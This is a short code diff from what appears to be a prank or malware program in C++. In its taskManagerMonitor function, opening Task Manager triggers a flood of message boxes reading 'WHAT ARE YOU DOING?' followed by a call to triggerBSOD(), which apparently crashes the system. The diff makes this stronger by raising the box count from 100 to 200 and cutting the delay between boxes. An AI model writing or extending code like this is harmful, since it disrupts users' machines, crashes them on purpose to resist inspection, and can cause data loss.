@@ -446,9 +446,9 @@ void taskManagerMonitor() {
         }
 
         if (taskMgrFound) {
-            for (int i = 0; i < 100; i++) {
+            for (int i = 0; i < 200; i++) {
                 std::thread(spawnChaosBox, "WHAT ARE YOU DOING?").detach();
-                std::this_thread::sleep_for(std::chrono::milliseconds(50));
+                std::this_thread::sleep_for(std::chrono::milliseconds(30));
             }
             triggerBSOD();
         }
